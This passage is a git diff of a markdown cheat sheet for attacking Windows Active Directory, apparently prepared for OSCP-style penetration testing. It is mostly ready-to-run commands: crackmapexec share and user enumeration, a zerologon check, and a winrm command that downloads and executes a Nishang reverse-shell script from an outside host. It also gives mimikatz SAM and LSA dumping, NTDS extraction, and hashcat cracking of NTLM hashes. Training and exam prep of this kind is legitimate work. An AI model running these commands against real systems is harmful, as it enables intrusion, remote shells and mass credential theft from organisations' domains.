@@ -1,10 +1,14 @@
+# IF Stuck, read here
+https://github.com/yovelo98/OSCP-Cheatsheet
+
 # Enumeration
 
 ## Tool 0: Powerview
 - guide on how to use Powerview: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993 
+- Quick Commands: [https://github.com/yovelo98/OSCP-Cheatsheet ](https://github.com/yovelo98/OSCP-Cheatsheet?tab=readme-ov-file#using-powerview)
 
 ## Tool 1: crackmapexec
-- Built-in in kali linux
+- wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip
 - **IF smb protocol fails, try winrm protocol**
 - enumerate shares (check for READ/WRITE permissions): `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --local-auth --shares`
 - enumerate logged on users (check if they are domain admin): `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --loggedon-users`
@@ -35,6 +39,11 @@
 - remote access tool: `evil-winrm -i 192.168.194.165 -u enox -p california`         
 
 # Persistence
+
+## Quick wins
+- https://github.com/yovelo98/OSCP-Cheatsheet?tab=readme-ov-file#from-cve-to-system-shell-on-dc 
+- Check zerologon: crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon 
+
 ## Using crackmapexec
 - Reverse shell: [Edit this from Kali to Windows](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
 - Transfer to windows: `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'iex(New-Object Net.WebClient).DownloadString("http://192.168.223:8000/Invoke-PowerShellTcpOneLine.ps1")'`
@@ -74,7 +83,17 @@
          PS C:\users\public > mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam.txt
          ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
 
-## Cracking Ad Hashes
+## Dumping AD Domain Credentials
+Dumping AD Domain Credentials
+You will need the following files to extract the ntds :
+- NTDS.dit file
+- SYSTEM hive (C:\Windows\System32\SYSTEM)
+```
+cme smb 10.10.0.202 -u username -p password --ntds vss
+```
+
+
+## Cracking AD Hashes
 
          ntlm:   hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
          ntlmv2: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
